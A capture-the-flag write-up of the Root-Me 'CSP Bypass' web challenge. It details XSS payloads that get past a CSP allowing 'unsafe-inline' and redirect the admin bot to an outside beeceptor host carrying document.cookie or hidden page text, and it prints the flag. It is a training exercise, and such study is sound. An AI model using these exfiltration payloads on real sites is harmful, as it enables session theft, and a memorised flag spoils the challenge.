# CSP Bypass Jsonp

## Description

Exfiltrate the content of the page!

[Start the challenge](http://challenge01.root-me.org/web-client/ch8/)

## Solution

We are asked to enter our username

![csp-bypass---inline-code.png](/assets/ctf/root-me/csp-bypass-inline-code.png)

The username is embedded in HTML with some other text.

![csp-bypass---inline-code-1.png](/assets/ctf/root-me/csp-bypass-inline-code-1.png)

If we find XSS we can report it to admins, link should be internal.

![csp-bypass---inline-code-2.png](/assets/ctf/root-me/csp-bypass-inline-code-2.png)

```bash
➜ curl http://challenge01.root-me.org:58008/page?user=test02 -I
HTTP/1.1 200 OK
Content-Security-Policy: connect-src 'none'; font-src 'none'; frame-src 'none'; img-src 'self'; manifest-src 'none'; media-src 'none'; object-src 'none'; script-src 'unsafe-inline'; style-src 'self'; worker-src 'none'; frame-ancestors 'none'; block-all-mixed-content;
...
```

[https://csp-evaluator.withgoogle.com](https://csp-evaluator.withgoogle.com)

![csp-bypass---inline-code-3.png](/assets/ctf/root-me/csp-bypass-inline-code-3.png)

The **`unsafe-inline`** **Content Security Policy** (CSP) keyword allows the execution of inline scripts or styles. [src](https://content-security-policy.com/unsafe-inline/)

Pop alert:
```html
<img src=x onerror=alert(1) />
```

[http://challenge01.root-me.org:58008/page?user=<img%20src=x%20onerror=alert(1)%20/>](http://challenge01.root-me.org:58008/page?user=<img%20src=x%20onerror=alert(1)%20/>)

![csp-bypass---inline-code-4.png](/assets/ctf/root-me/csp-bypass-inline-code-4.png)

`fetch` is blocked, but `navigator.sendBeacon` is not. `:` is also blocked, `http`. Quotes break the html 

I already had a domain running so I tested with sendBeacon, but doesn't work due to `Refused to connect to 'http://b64.domain.tld/e/' because it violates the following Content Security Policy directive: "connect-src 'none'".`
```
http://challenge01.root-me.org:58008/page?user=<img%20src=x%20onerror=navigator.sendBeacon(`//b64.domain.tld/e/`,`data=hello`)%20/>
```

It's possible to change location with `document.location=IP_or_DOMAIN`

For testing I set cookies 
```html
Payload: <img src=x onerror=document.location=`//https://uwuos.free.beeceptor.com?c=${document.cookie}` />

http://challenge01.root-me.org:58008/page?user=<img%20src=x%20onerror=document.location=`//https://uwuos.free.beeceptor.com?c=${document.cookie}`%20/>
```

The payload works, now we need to read the page contents because it's only visible to admin.

![csp-bypass---inline-code-5.png](/assets/ctf/root-me/csp-bypass-inline-code-5.png)

```
Payload: <img src=x onerror=document.location=`//uwuos.free.beeceptor.com?c=`+document.querySelector('.message').firstElementChild.textContent />
URL: http://challenge01.root-me.org:58008/page?user=%3Cimg+src%3Dx+onerror%3Ddocument.location%3D%60%2F%2Fuwuos.free.beeceptor.com%3Fc%3D%60%2Bdocument.querySelector%28%27.message%27%29.firstElementChild.textContent+%2F%3E
```

Send it to `/report`

![csp-bypass---inline-code-6.png](/assets/ctf/root-me/csp-bypass-inline-code-6.png)

```
At Quackquack corp the developers think that they do not have to patch XSS because they implement the Content Security Policy (CSP). But you are a hacker, right ? I'm sure you will be able to exfiltrate this flag: CSP_34SY_T0_BYP4S_W1TH_SCR1PT. (Only the bot is able to see the flag)
```

::: tip Flag
`CSP_34SY_T0_BYP4S_W1TH_SCR1PT`
:::

